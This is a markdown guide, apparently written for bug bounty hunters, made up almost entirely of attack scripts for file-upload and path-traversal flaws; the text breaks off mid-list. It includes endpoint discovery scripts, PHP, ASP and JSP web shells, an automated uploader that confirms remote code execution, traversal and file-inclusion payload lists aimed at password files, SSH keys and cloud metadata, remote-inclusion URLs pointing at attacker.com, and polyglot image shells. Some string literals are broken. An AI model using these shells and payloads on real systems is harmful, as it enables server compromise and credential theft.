# 🔥 Elite File Upload & Path Traversal Attack Framework
## Advanced Techniques for $1000+ Bug Bounty Rewards

### 🎯 Overview
File upload vulnerabilities are among the highest-paying bugs in bug bounty programs. This comprehensive framework covers everything from basic bypass techniques to advanced exploitation methods used by elite red teams.

## 🛠️ Phase 1: File Upload Discovery & Enumeration

### Automated File Upload Discovery
```bash
#!/bin/bash
# file_upload_discovery.sh - Discover file upload endpoints

TARGET=$1
echo "🔍 Discovering file upload endpoints for $TARGET"

# Method 1: Common upload paths
cat > upload_paths.txt << 'EOF'
/upload
/uploads
/file-upload
/fileupload
/upload.php
/upload.asp
/upload.aspx
/upload.jsp
/uploader
/uploader.php
/media/upload
/admin/upload
/user/upload
/api/upload
/api/v1/upload
/api/v2/upload
/files/upload
/assets/upload
/images/upload
/documents/upload
/attachments/upload
/avatar/upload
/profile/upload
/photo/upload
/picture/upload
/file/upload
/data/upload
/tmp/upload
/temp/upload
/public/upload
/private/upload
/secure/upload
/editor/upload
/ckeditor/upload
/tinymce/upload
/fckeditor/upload
/elfinder/upload
/filemanager/upload
/cms/upload
/admin/filemanager/upload
/wp-admin/upload
/wp-content/uploads
/sites/default/files
/drupal/upload
/joomla/upload
/magento/upload
/prestashop/upload
/opencart/upload
EOF

# Test upload endpoints
echo "🎯 Testing upload endpoints..."
for url in $(cat live_urls.txt); do
    for path in $(cat upload_paths.txt); do
        full_url="$url$path"
        response=$(curl -s -o /dev/null -w "%{http_code}" "$full_url")
        if [[ "$response" == "200" || "$response" == "302" || "$response" == "403" ]]; then
            echo "✅ Found upload endpoint: $full_url ($response)"
            echo "$full_url" >> upload_endpoints.txt
        fi
    done
done

# Method 2: JavaScript analysis for upload functionality
echo "🔍 Analyzing JavaScript for upload functionality..."
cat live_urls.txt | katana -d 3 -js-crawl | grep "\.js$" | httpx -silent -mc 200 | while read js_url; do
    curl -s "$js_url" | grep -Eo "(upload|file|attachment)" | head -1 && echo "JS Upload found: $js_url" >> js_upload_endpoints.txt
done

# Method 3: Form analysis for file inputs
echo "🔍 Analyzing forms for file inputs..."
for url in $(cat live_urls.txt); do
    curl -s "$url" | grep -i "type=["']file["']" && echo "File input found: $url" >> form_upload_endpoints.txt
done

# Method 4: API endpoint discovery
echo "🔍 Discovering API upload endpoints..."
cat > api_upload_paths.txt << 'EOF'
/api/upload
/api/v1/upload
/api/v2/upload
/api/files
/api/media
/api/attachments
/api/documents
/api/images
/rest/upload
/rest/files
/graphql
/upload/api
/files/api
EOF

for url in $(cat live_urls.txt); do
    for path in $(cat api_upload_paths.txt); do
        full_url="$url$path"
        # Test with OPTIONS method
        response=$(curl -s -X OPTIONS "$full_url" -w "%{http_code}" -o /dev/null)
        if [[ "$response" == "200" ]]; then
            echo "✅ API upload endpoint: $full_url"
            echo "$full_url" >> api_upload_endpoints.txt
        fi
    done
done

echo "✅ Upload discovery completed!"
```

### Advanced Upload Endpoint Fingerprinting
```python
#!/usr/bin/env python3
# upload_fingerprint.py - Advanced upload endpoint fingerprinting

import requests
import json
import mimetypes
from urllib.parse import urljoin
import os

class UploadFingerprinter:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        self.test_files = {
            'image': ('test.jpg', b'\xff\xd8\xff\xe0\x00\x10JFIF', 'image/jpeg'),
            'text': ('test.txt', b'Hello World', 'text/plain'),
            'pdf': ('test.pdf', b'%PDF-1.4', 'application/pdf'),
            'zip': ('test.zip', b'PK\x03\x04', 'application/zip'),
            'xml': ('test.xml', b'<?xml version="1.0"?><root></root>', 'text/xml'),
            'json': ('test.json', b'{"test": "data"}', 'application/json'),
            'csv': ('test.csv', b'name,value
test,123', 'text/csv'),
            'html': ('test.html', b'<html><body>Test</body></html>', 'text/html'),
            'js': ('test.js', b'console.log("test");', 'application/javascript'),
            'php': ('test.php', b'<?php echo "test"; ?>', 'application/x-php'),
            'asp': ('test.asp', b'<%Response.Write("test")%>', 'text/asp'),
            'jsp': ('test.jsp', b'<%out.println("test");%>', 'application/x-jsp'),
            'exe': ('test.exe', b'MZ\x90\x00', 'application/x-msdownload'),
        }
    
    def fingerprint_upload(self, url):
        """Comprehensive upload endpoint fingerprinting"""
        results = {
            'url': url,
            'methods': [],
            'accepted_types': [],
            'rejected_types': [],
            'max_size': None,
            'security_measures': [],
            'vulnerabilities': []
        }
        
        # Test HTTP methods
        methods = ['POST', 'PUT', 'PATCH']
        for method in methods:
            try:
                response = self.session.request(method, url, timeout=10)
                if response.status_code not in [404, 405]:
                    results['methods'].append(method)
                    print(f"✅ {method} method accepted on {url}")
            except:
                continue
        
        # Test file type acceptance
        for file_type, (filename, content, mime_type) in self.test_files.items():
            try:
                files = {'file': (filename, content, mime_type)}
                response = self.session.post(url, files=files, timeout=10)
                
                if response.status_code == 200:
                    results['accepted_types'].append(file_type)
                    print(f"✅ {file_type} files accepted")
                    
                    # Check for direct execution
                    if file_type in ['php', 'asp', 'jsp'] and 'test' in response.text:
                        results['vulnerabilities'].append(f'Code execution via {file_type}')
                        print(f"🔥 CRITICAL: Code execution possible with {file_type}")
                        
                elif response.status_code in [400, 403, 415]:
                    results['rejected_types'].append(file_type)
                    
                    # Analyze rejection reason
                    if 'size' in response.text.lower():
                        results['security_measures'].append('File size validation')
                    if 'type' in response.text.lower() or 'extension' in response.text.lower():
                        results['security_measures'].append('File type validation')
                    if 'virus' in response.text.lower() or 'malware' in response.text.lower():
                        results['security_measures'].append('Antivirus scanning')
                        
            except Exception as e:
                continue
        
        # Test file size limits
        self.test_file_size_limits(url, results)
        
        # Test bypass techniques
        self.test_bypass_techniques(url, results)
        
        return results
    
    def test_file_size_limits(self, url, results):
        """Test file size limitations"""
        sizes = [1024, 10240, 102400, 1048576, 10485760]  # 1KB to 10MB
        
        for size in sizes:
            try:
                large_content = b'A' * size
                files = {'file': ('large.txt', large_content, 'text/plain')}
                response = self.session.post(url, files=files, timeout=15)
                
                if response.status_code == 200:
                    results['max_size'] = size
                else:
                    break
            except:
                break
    
    def test_bypass_techniques(self, url, results):
        """Test various bypass techniques"""
        bypass_tests = [
            # Double extension bypass
            ('bypass.php.jpg', b'<?php echo "bypass"; ?>', 'image/jpeg'),
            # Null byte bypass
            ('bypass.php\x00.jpg', b'<?php echo "bypass"; ?>', 'image/jpeg'),
            # Case sensitivity bypass
            ('bypass.PHP', b'<?php echo "bypass"; ?>', 'text/plain'),
            # Content-Type spoofing
            ('bypass.php', b'<?php echo "bypass"; ?>', 'image/jpeg'),
            # Magic bytes bypass
            ('bypass.php', b'\xff\xd8\xff\xe0<?php echo "bypass"; ?>', 'image/jpeg'),
            # Polyglot file
            ('bypass.jpg', b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01<?php echo "bypass"; ?>', 'image/jpeg'),
        ]
        
        for filename, content, mime_type in bypass_tests:
            try:
                files = {'file': (filename, content, mime_type)}
                response = self.session.post(url, files=files, timeout=10)
                
                if response.status_code == 200:
                    results['vulnerabilities'].append(f'Bypass successful: {filename}')
                    print(f"🔥 BYPASS SUCCESSFUL: {filename}")
                    
            except:
                continue

# Usage
def main():
    with open('upload_endpoints.txt', 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    fingerprinter = UploadFingerprinter()
    all_results = []
    
    for url in urls:
        print(f"🎯 Fingerprinting {url}")
        result = fingerprinter.fingerprint_upload(url)
        all_results.append(result)
    
    # Save results
    with open('upload_fingerprint_results.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
    print(f"✅ Fingerprinting completed! Results saved to upload_fingerprint_results.json")

if __name__ == "__main__":
    main()
```

## 💰 Phase 2: Critical File Upload Vulnerabilities

### 1. Remote Code Execution via File Upload
```python
#!/usr/bin/env python3
# file_upload_rce.py - Test RCE via file upload

import requests
import time
import random
import string
from urllib.parse import urljoin, urlparse

class FileUploadRCETester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Web shell payloads for different technologies
        self.web_shells = {
            'php': {
                'simple': b'<?php system($_GET["cmd"]); ?>',
                'advanced': b'<?php if(isset($_GET["cmd"])){echo "<pre>";system($_GET["cmd"]);echo "</pre>";} ?>',
                'obfuscated': b'<?php $a=$_GET;$b=$a["cmd"];system($b); ?>',
                'eval': b'<?php eval($_POST["code"]); ?>',
                'file_ops': b'<?php if($_GET["f"]=="r"){echo file_get_contents($_GET["p"]);}if($_GET["f"]=="w"){file_put_contents($_GET["p"],$_GET["c"]);} ?>'
            },
            'asp': {
                'simple': b'<%eval request("cmd")%>',
                'advanced': b'<%Set objShell=CreateObject("WScript.Shell"):Response.Write(objShell.Exec(Request("cmd")).StdOut.ReadAll())%>',
                'file_ops': b'<%Set fso=CreateObject("Scripting.FileSystemObject"):Response.Write(fso.OpenTextFile(Request("f")).ReadAll())%>'
            },
            'aspx': {
                'simple': b'<%@ Page Language="C#" %><%System.Diagnostics.Process.Start("cmd","/c " + Request["cmd"]);%>',
                'advanced': b'<%@ Page Language="C#" %><%Response.Write(System.Diagnostics.Process.Start("cmd","/c " + Request["cmd"]).StandardOutput.ReadToEnd());%>'
            },
            'jsp': {
                'simple': b'<%Runtime.getRuntime().exec(request.getParameter("cmd"));%>',
                'advanced': b'<%java.io.InputStream in=Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream();int a=-1;byte[] b=new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%>'
            },
            'python': {
                'simple': b'import os;os.system(input())',
                'flask': b'from flask import request;import os;@app.route("/shell")def shell():return os.popen(request.args.get("cmd")).read()'
            }
        }
        
        # Bypass techniques
        self.bypass_extensions = [
            '.php', '.php3', '.php4', '.php5', '.php7', '.phtml', '.pht',
            '.asp', '.aspx', '.asa', '.asax', '.ascx',
            '.jsp', '.jspx', '.jsw', '.jsv', '.jspf',
            '.py', '.py3', '.pyw', '.pyo', '.pyc',
            '.pl', '.cgi', '.sh', '.bat', '.cmd',
            '.exe', '.scr', '.com', '.pif'
        ]
        
        self.bypass_techniques = [
            lambda name, ext: f"{name}.{ext}",  # Normal
            lambda name, ext: f"{name}.{ext}.jpg",  # Double extension
            lambda name, ext: f"{name}.jpg.{ext}",  # Reverse double extension
            lambda name, ext: f"{name}.{ext.upper()}",  # Case variation
            lambda name, ext: f"{name}.{ext}\x00.jpg",  # Null byte
            lambda name, ext: f"{name}.{ext}%00.jpg",  # URL encoded null
            lambda name, ext: f"{name}.{ext} ",  # Trailing space
            lambda name, ext: f"{name}.{ext}.",  # Trailing dot
            lambda name, ext: f"{name}..{ext}",  # Double dot
            lambda name, ext: f"{name}.{ext}::$DATA",  # NTFS ADS
        ]
    
    def generate_random_name(self, length=8):
        """Generate random filename"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    def test_rce_upload(self, upload_url):
        """Test RCE via file upload"""
        results = []
        
        for tech, shells in self.web_shells.items():
            for shell_name, shell_code in shells.items():
                for ext in [ext for ext in self.bypass_extensions if tech in ext or ext.startswith(f'.{tech}')]:
                    for bypass_func in self.bypass_techniques:
                        try:
                            # Generate unique filename
                            base_name = self.generate_random_name()
                            filename = bypass_func(base_name, ext.lstrip('.'))
                            
                            # Prepare file upload
                            files = {'file': (filename, shell_code, 'application/octet-stream')}
                            
                            # Upload file
                            response = self.session.post(upload_url, files=files, timeout=10)
                            
                            if response.status_code == 200:
                                # Try to find uploaded file location
                                uploaded_url = self.find_uploaded_file(upload_url, filename, response)
                                
                                if uploaded_url:
                                    # Test RCE
                                    rce_result = self.test_code_execution(uploaded_url, tech)
                                    if rce_result:
                                        results.append({
                                            'upload_url': upload_url,
                                            'filename': filename,
                                            'uploaded_url': uploaded_url,
                                            'technology': tech,
                                            'shell_type': shell_name,
                                            'bypass_technique': bypass_func.__name__,
                                            'rce_confirmed': True,
                                            'test_output': rce_result
                                        })
                                        print(f"🔥 CRITICAL RCE: {uploaded_url} - {tech} shell uploaded!")
                                        return results  # Return immediately on first RCE
                                        
                        except Exception as e:
                            continue
        
        return results
    
    def find_uploaded_file(self, upload_url, filename, response):
        """Try to find the uploaded file location"""
        base_url = '/'.join(upload_url.split('/')[:-1])
        
        # Common upload directories
        upload_dirs = [
            '/uploads/',
            '/upload/',
            '/files/',
            '/media/',
            '/assets/',
            '/images/',
            '/documents/',
            '/attachments/',
            '/tmp/',
            '/temp/',
            '/public/',
            '/static/',
            '/content/',
            '/data/',
            '/user_uploads/',
            '/file_uploads/',
            '/wp-content/uploads/',
            '/sites/default/files/',
        ]
        
        # Try to extract upload path from response
        if 'uploaded' in response.text.lower():
            # Look for file paths in response
            import re
            paths = re.findall(r'["']([^"']*' + re.escape(filename) + r')["']', response.text)
            if paths:
                return urljoin(base_url, paths[0])
        
        # Try common upload directories
        for upload_dir in upload_dirs:
            test_url = urljoin(base_url, upload_dir + filename)
            try:
                test_response = self.session.get(test_url, timeout=5)
                if test_response.status_code == 200:
                    return test_url
            except:
                continue
        
        return None
    
    def test_code_execution(self, file_url, tech):
        """Test if uploaded file can execute code"""
        test_commands = {
            'php': [
                ('?cmd=echo "RCE_TEST_SUCCESS"', 'RCE_TEST_SUCCESS'),
                ('?cmd=whoami', None),
                ('?cmd=id', 'uid='),
                ('?cmd=pwd', '/'),
            ],
            'asp': [
                ('?cmd=echo RCE_TEST_SUCCESS', 'RCE_TEST_SUCCESS'),
                ('?cmd=whoami', None),
            ],
            'aspx': [
                ('?cmd=echo RCE_TEST_SUCCESS', 'RCE_TEST_SUCCESS'),
                ('?cmd=whoami', None),
            ],
            'jsp': [
                ('?cmd=echo RCE_TEST_SUCCESS', 'RCE_TEST_SUCCESS'),
                ('?cmd=whoami', None),
            ]
        }
        
        if tech not in test_commands:
            return None
        
        for cmd_param, expected in test_commands[tech]:
            try:
                test_url = file_url + cmd_param
                response = self.session.get(test_url, timeout=10)
                
                if expected and expected in response.text:
                    return response.text
                elif not expected and response.text.strip():
                    return response.text
                    
            except:
                continue
        
        return None
    
    def test_path_traversal_upload(self, upload_url):
        """Test path traversal via filename"""
        traversal_payloads = [
            '../../../etc/passwd',
            '..\..\..\windows\system32\drivers\etc\hosts',
            '../../../var/www/html/shell.php',
            '..\..\..\inetpub\wwwroot\shell.asp',
            '../../../tmp/shell.php',
            '../../../home/user/shell.php',
            '../../../../usr/share/nginx/html/shell.php',
            '../../../var/log/apache2/shell.php',
        ]
        
        results = []
        
        for payload in traversal_payloads:
            try:
                shell_code = b'<?php echo "PATH_TRAVERSAL_SUCCESS"; ?>'
                files = {'file': (payload, shell_code, 'text/plain')}
                
                response = self.session.post(upload_url, files=files, timeout=10)
                
                if response.status_code == 200:
                    # Try to access the file at the traversed location
                    test_paths = [
                        '/etc/passwd',
                        '/windows/system32/drivers/etc/hosts',
                        '/shell.php',
                        '/tmp/shell.php',
                    ]
                    
                    base_url = '/'.join(upload_url.split('/')[:-1])
                    
                    for test_path in test_paths:
                        test_url = urljoin(base_url, test_path)
                        try:
                            test_response = self.session.get(test_url, timeout=5)
                            if 'PATH_TRAVERSAL_SUCCESS' in test_response.text:
                                results.append({
                                    'upload_url': upload_url,
                                    'traversal_payload': payload,
                                    'accessible_url': test_url,
                                    'vulnerability': 'Path Traversal via Upload'
                                })
                                print(f"🔥 PATH TRAVERSAL: File uploaded to {test_url}")
                        except:
                            continue
                            
            except:
                continue
        
        return results

# Usage
def main():
    with open('upload_endpoints.txt', 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    rce_tester = FileUploadRCETester()
    all_results = []
    
    for url in urls:
        print(f"🎯 Testing RCE on {url}")
        
        # Test RCE
        rce_results = rce_tester.test_rce_upload(url)
        all_results.extend(rce_results)
        
        # Test Path Traversal
        traversal_results = rce_tester.test_path_traversal_upload(url)
        all_results.extend(traversal_results)
    
    # Save results
    with open('file_upload_rce_results.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
    print(f"✅ RCE testing completed! Found {len(all_results)} vulnerabilities")

if __name__ == "__main__":
    main()
```

### 2. Advanced Path Traversal Testing
```python
#!/usr/bin/env python3
# path_traversal_advanced.py - Advanced path traversal testing

import requests
import urllib.parse
import base64
import json

class AdvancedPathTraversalTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Path traversal payloads
        self.traversal_payloads = [
            # Basic traversal
            '../../../etc/passwd',
            '..\..\..\windows\system32\drivers\etc\hosts',
            
            # URL encoded
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cdrivers%5cetc%5chosts',
            
            # Double URL encoded
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            
            # Unicode encoded
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd',
            
            # 16-bit Unicode
            '..%u002f..%u002f..%u002fetc%u002fpasswd',
            
            # Overlong UTF-8
            '..%e0%80%af..%e0%80%af..%e0%80%afetc%e0%80%afpasswd',
            
            # Null byte injection
            '../../../etc/passwd%00',
            '../../../etc/passwd%00.jpg',
            
            # Filter bypass
            '....//....//....//etc/passwd',
            '....\\....\\....\\windows\system32\drivers\etc\hosts',
            
            # Absolute paths
            '/etc/passwd',
            'C:\windows\system32\drivers\etc\hosts',
            
            # Environment variables
            '$HOME/.bash_history',
            '%USERPROFILE%\Desktop',
            
            # Proc filesystem (Linux)
            '/proc/self/environ',
            '/proc/version',
            '/proc/cmdline',
            '/proc/self/stat',
            '/proc/self/status',
            '/proc/self/fd/0',
            '/proc/self/fd/1',
            '/proc/self/fd/2',
            
            # Log files
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/auth.log',
            '/var/log/syslog',
            'C:\inetpub\logs\LogFiles\W3SVC1\ex*.log',
            
            # Configuration files
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            '/etc/mysql/my.cnf',
            '/etc/ssh/sshd_config',
            'C:\windows\system32\inetsrv\config\applicationHost.config',
            
            # Application files
            '/var/www/html/config.php',
            '/var/www/html/.env',
            'C:\inetpub\wwwroot\web.config',
            
            # Database files
            '/var/lib/mysql/mysql/user.MYD',
            'C:\Program Files\MySQL\MySQL Server 8.0\data\mysql\user.MYD',
            
            # SSH keys
            '/home/user/.ssh/id_rsa',
            '/root/.ssh/id_rsa',
            'C:\Users\Administrator\.ssh\id_rsa',
            
            # Cloud metadata
            'http://169.254.169.254/latest/meta-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            
            # Container escape
            '/proc/1/cgroup',
            '/proc/self/cgroup',
            '/.dockerenv',
            '/run/secrets/kubernetes.io/serviceaccount/token',
        ]
        
        # Sensitive files to test
        self.sensitive_files = {
            'linux': [
                '/etc/passwd',
                '/etc/shadow',
                '/etc/hosts',
                '/etc/hostname',
                '/etc/issue',
                '/etc/group',
                '/etc/crontab',
                '/etc/fstab',
                '/etc/resolv.conf',
                '/proc/version',
                '/proc/cpuinfo',
                '/proc/meminfo',
                '/proc/self/environ',
            ],
            'windows': [
                'C:\windows\system32\drivers\etc\hosts',
                'C:\windows\system32\drivers\etc\
etworks',
                'C:\windows\system32\drivers\etc\services',
                'C:\windows\win.ini',
                'C:\windows\system.ini',
                'C:\boot.ini',
                'C:\windows\system32\config\sam',
                'C:\windows\system32\config\system',
                'C:\windows\system32\config\software',
            ]
        }
    
    def test_path_traversal(self, url, parameter=None):
        """Test path traversal vulnerabilities"""
        results = []
        
        for payload in self.traversal_payloads:
            try:
                # Test different injection points
                if parameter:
                    # Parameter-based injection
                    test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                else:
                    # Path-based injection
                    test_url = f"{url}/{payload}"
                    response = self.session.get(test_url, timeout=10)
                
                # Check for successful traversal
                if self.is_successful_traversal(response.text, payload):
                    results.append({
                        'url': test_url,
                        'payload': payload,
                        'method': 'GET',
                        'parameter': parameter,
                        'response_snippet': response.text[:500],
                        'vulnerability': 'Path Traversal'
                    })
                    print(f"🔥 PATH TRAVERSAL: {test_url}")
                
                # Test POST method
                if parameter:
                    post_data = {parameter: payload}
                    response = self.session.post(url, data=post_data, timeout=10)
                    
                    if self.is_successful_traversal(response.text, payload):
                        results.append({
                            'url': url,
                            'payload': payload,
                            'method': 'POST',
                            'parameter': parameter,
                            'response_snippet': response.text[:500],
                            'vulnerability': 'Path Traversal'
                        })
                        print(f"🔥 PATH TRAVERSAL (POST): {url} - {parameter}={payload}")
                
            except Exception as e:
                continue
        
        return results
    
    def is_successful_traversal(self, response_text, payload):
        """Check if path traversal was successful"""
        # Linux indicators
        linux_indicators = [
            'root:x:0:0:',  # /etc/passwd
            'daemon:x:1:1:',  # /etc/passwd
            'bin:x:2:2:',  # /etc/passwd
            'localhost',  # /etc/hosts
            'Linux version',  # /proc/version
            'MemTotal:',  # /proc/meminfo
            'processor',  # /proc/cpuinfo
        ]
        
        # Windows indicators
        windows_indicators = [
            '# Copyright (c) 1993-2009 Microsoft Corp.',  # hosts file
            '[fonts]',  # win.ini
            '[386Enh]',  # system.ini
            'multi(0)disk(0)rdisk(0)',  # boot.ini
        ]
        
        # Check for indicators
        response_lower = response_text.lower()
        
        for indicator in linux_indicators + windows_indicators:
            if indicator.lower() in response_lower:
                return True
        
        # Check for specific file content based on payload
        if 'passwd' in payload and ('root:' in response_text or 'daemon:' in response_text):
            return True
        if 'hosts' in payload and ('localhost' in response_text or '127.0.0.1' in response_text):
            return True
        if 'version' in payload and 'linux' in response_lower:
            return True
        
        return False
    
    def test_file_inclusion(self, url, parameter=None):
        """Test Local File Inclusion (LFI) vulnerabilities"""
        results = []
        
        # LFI-specific payloads
        lfi_payloads = [
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/read=string.rot13/resource=index.php',
            'php://filter/convert.iconv.utf-8.utf-16/resource=index.php',
            'data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==',  # <?php phpinfo(); ?>
            'expect://whoami',
            'file:///etc/passwd',
            'zip://shell.jpg%23shell.php',
            'phar://shell.jpg/shell.php',
        ]
        
        for payload in lfi_payloads:
            try:
                if parameter:
                    test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                else:
                    test_url = f"{url}/{payload}"
                    response = self.session.get(test_url, timeout=10)
                
                # Check for successful LFI
                if self.is_successful_lfi(response.text, payload):
                    results.append({
                        'url': test_url,
                        'payload': payload,
                        'method': 'GET',
                        'parameter': parameter,
                        'response_snippet': response.text[:500],
                        'vulnerability': 'Local File Inclusion'
                    })
                    print(f"🔥 LFI: {test_url}")
                
            except Exception as e:
                continue
        
        return results
    
    def is_successful_lfi(self, response_text, payload):
        """Check if LFI was successful"""
        # PHP filter indicators
        if 'php://filter' in payload:
            # Base64 encoded content
            if len(response_text) > 50 and response_text.replace('
', '').replace(' ', '').isalnum():
                try:
                    decoded = base64.b64decode(response_text).decode('utf-8', errors='ignore')
                    if '<?php' in decoded or 'function' in decoded:
                        return True
                except:
                    pass
        
        # Data URI indicators
        if 'data://' in payload and ('phpinfo' in response_text or 'PHP Version' in response_text):
            return True
        
        # Expect wrapper indicators
        if 'expect://' in payload and response_text.strip():
            return True
        
        # File URI indicators
        if 'file://' in payload:
            return self.is_successful_traversal(response_text, payload)
        
        return False
    
    def test_remote_file_inclusion(self, url, parameter=None):
        """Test Remote File Inclusion (RFI) vulnerabilities"""
        results = []
        
        # RFI payloads (use your own server for testing)
        rfi_payloads = [
            'http://attacker.com/shell.txt',
            'https://attacker.com/shell.txt',
            'ftp://attacker.com/shell.txt',
            'http://attacker.com/shell.txt?',
            'http://attacker.com/shell.txt%00',
            'http://attacker.com/shell.txt%23',
        ]
        
        for payload in rfi_payloads:
            try:
                if parameter:
                    test_url = f"{url}?{parameter}={urllib.parse.quote(payload)}"
                    response = self.session.get(test_url, timeout=10)
                    
                    # Check if remote file was included
                    if 'RFI_TEST_SUCCESS' in response.text:
                        results.append({
                            'url': test_url,
                            'payload': payload,
                            'method': 'GET',
                            'parameter': parameter,
                            'vulnerability': 'Remote File Inclusion'
                        })
                        print(f"🔥 RFI: {test_url}")
                
            except Exception as e:
                continue
        
        return results

# Usage
def main():
    with open('live_urls.txt', 'r') as f:
        urls = [line.strip() for line in f if line.strip()]
    
    traversal_tester = AdvancedPathTraversalTester()
    all_results = []
    
    # Common parameters to test
    test_parameters = [
        'file', 'path', 'page', 'include', 'inc', 'load', 'read', 'view', 'show',
        'template', 'document', 'filename', 'filepath', 'dir', 'folder', 'location',
        'url', 'uri', 'src', 'source', 'resource', 'data', 'content', 'cat', 'get'
    ]
    
    for url in urls:
        print(f"🎯 Testing path traversal on {url}")
        
        # Test without parameters (path-based)
        results = traversal_tester.test_path_traversal(url)
        all_results.extend(results)
        
        # Test with parameters
        for param in test_parameters:
            results = traversal_tester.test_path_traversal(url, param)
            all_results.extend(results)
            
            # Test LFI
            lfi_results = traversal_tester.test_file_inclusion(url, param)
            all_results.extend(lfi_results)
            
            # Test RFI
            rfi_results = traversal_tester.test_remote_file_inclusion(url, param)
            all_results.extend(rfi_results)
    
    # Save results
    with open('path_traversal_results.json', 'w') as f:
        json.dump(all_results, f, indent=2)
    
    print(f"✅ Path traversal testing completed! Found {len(all_results)} vulnerabilities")

if __name__ == "__main__":
    main()
```

## 🔧 Phase 3: Advanced Bypass Techniques

### File Upload Filter Bypass Framework
```python
#!/usr/bin/env python3
# upload_bypass_framework.py - Advanced file upload bypass techniques

import requests
import mimetypes
import magic
import hashlib
import struct
from PIL import Image
import io

class UploadBypassFramework:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Magic bytes for different file types
        self.magic_bytes = {
            'jpg': b'\xff\xd8\xff\xe0',
            'png': b'\x89PNG
\x1a
',
            'gif': b'GIF89a',
            'pdf': b'%PDF-1.4',
            'zip': b'PK\x03\x04',
            'rar': b'Rar!\x1a\x07\x00',
            'exe': b'MZ',
            'elf': b'\x7fELF',
        }
        
        # Polyglot templates
        self.polyglot_templates = {
            'jpg_php': b'\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x01\x00H\x00H\x00\x00\xff\xfe\x00\x13Created with GIMP\xff\xdb\x00C\x00<?php system($_GET["cmd"]); ?>',
            'png_php': b'\x89PNG
\x1a
\x00\x00\x00IHDR\x00\x00\x00\x01\x00\x00\x00\x01\x08\x02\x00\x00\x00\x90wS\xde\x00\x00\x00	pHYs\x00\x00\x0b\x13\x00\x00\x0b\x13\x01\x00\x9a\x9c\x18\x00\x00\x00\x07tIME\x07\xdb\x0c\x17\x02;\x04\x1a\xb5\xdb\xd6\x00\x00\x00\x0bIDATx\x9cc\xf8\x00\x00\x00\x01\x00\x01\x00\x00\x00\x00IEND\xaeB`\x82<?php system($_GET["cmd"]); ?>',
            'gif_php': b'GIF89a\x01\x00\x01\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00;<?php system($_GET["cmd"]); ?>',
        }
    
    def create_polyglot_file(self, file_type, payload):
        """Create polyglot files that are valid images but contain code"""
        if file_type == 'jpg':
            return self.create_jpg_polyglot(payload)
        elif file_type == 'png':
            return self.create_png_polyglot(payload)
        elif file_type == 'gif':
            return self.create_gif_polyglot(payload)
        else:
            return None
    
    def create_jpg_polyglot(self, payload):
        """Create JPG polyglot with embedded payload"""
        # Create a minimal valid JPEG
        img = Image.new('RGB', (1, 1), color='white')
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='JPEG')
        jpg_data = img_bytes.getvalue()
        
        # Insert payload before the end marker
        end_marker = b'\xff\xd9'
        if end_marker in jpg_data:
            parts = jpg_data.split(end_marker)
            polyglot = parts[0] + payload.encode() + end_marker + b''.join(parts[1:])
        else:
            polyglot = jpg_data + payload.encode()
        
        return polyglot
    
    def create_png_polyglot(self, payload):
        """Create PNG polyglot with embedded payload"""
        # Create minimal PNG
        img = Image.new('RGB', (1, 1), color='white')
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        png_data = img_bytes.getvalue()
        
        # Append payload after IEND chunk
        iend_marker = b'IEND\xaeB`\x82'
        if iend_marker in png_data:
            polyglot = png_data.replace(iend_marker, iend_marker + payload.encode())
        else:
            polyglot = png_data + payload.encode()
        
        return polyglot
    
    def create_gif_polyglot(self, payload):
        """Create GIF polyglot with embedded payload"""
        # Minimal GIF header
        gif_header = b'GIF89a\x01\x00\x01\x00\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x04\x01\x00;'
        return gif_header + payload.encode()
    
    def test_extension_bypasses(self, upload_url, payload):
        """Test various extension bypass techniques"""
        results = []
        base_name = 'shell'
        
        # Extension bypass techniques
        bypass_techniques = [
            # Basic extensions
            f'{base_name}.php',
            f'{base_name}.php3',
            f'{base_name}.php4',
            f'{base_name}.php5',
            f'{base_name}.php7',
            f'{base_name}.phtml',
            f'{base_name}.pht',
            f'{base_name}.phps',
            
            # Double extensions
            f'{base_name}.php.jpg',
            f'{base_name}.jpg.php',
            f'{base_name}.php.png',
            f'{base_name}.png.php',
            f'{base_name}.php.gif',
            f'{base_name}.gif.php',
            
